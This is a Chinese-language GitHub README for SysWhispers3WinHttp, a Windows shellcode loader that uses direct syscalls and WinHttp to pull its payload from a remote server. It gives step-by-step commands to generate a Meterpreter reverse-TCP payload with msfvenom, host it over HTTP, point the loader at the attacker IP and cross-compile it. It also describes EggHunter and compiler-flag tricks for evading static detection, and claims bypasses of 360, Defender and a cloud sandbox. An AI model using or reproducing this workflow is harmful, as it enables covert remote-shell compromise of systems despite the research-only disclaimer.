# SysWhispers3WinHttp
SysWhispers3WinHttp 基于SysWhispers3增添WinHttp分离加载，在Linux下使用GCC进行交叉编译。

## 0x00 免责声明

该项目仅供安全研究使用，禁止使用该项目进行违法操作，否则由使用者承担全部法律及连带责任。

## 0x01 更新日志

2024/06/20 增添MinGW下EggHunter技术，绕过对syscall指令的静态检测。

2023/07/03 支持64位程序在Windows 7 x64上线。

2023/06/06 支持64位GCC编译与Stager方式上线SliverC2，增添编译参数绕过静态检测。

## 0x02 使用

```
// 1. 使用msfvenom生成Shellcode（或使用CobaltStrike生成Stageless之Shellcode）
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=x.x.x.x lport=4444 -f raw -o beacon.bin

// 2. 使用python3开启Web服务（或使用CobaltStrike之HostFile功能）
python3 -m http.server

// 3. 修改SysWhispers3WinHttp.c第72行IP地址，使用Linux64位GCC进行交叉编译
x86_64-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls64.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -lpsapi

// ps. 或修改SysWhispers3WinHttp.c第4行头文件为syscalls.h，修改第72行IP地址，使用Linux32位GCC进行交叉编译
i686-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -lpsapi
```

## 0x03 演示

360云安全计划（2024/06/21更新）
![360云安全计划](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/a777d104-1f93-4e16-931c-0b2222c64504)

360核晶（2023/06/06更新）
![360](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/f02a6de4-d6db-4012-91f8-e75df30f49ab)

Defender（2023/06/06更新）
![WD](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/33e47a93-59ba-48b1-aecb-ffb11dad66bc)

微步云沙箱
![threatbook](https://github.com/huaigu4ng/SysWhispers3WinHttp/assets/128464183/bfd99aee-6f82-4960-a461-12c1b83b594a)

## 0x04 参考链接
https://github.com/klezVirus/SysWhispers3

https://learn.microsoft.com/zh-cn/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
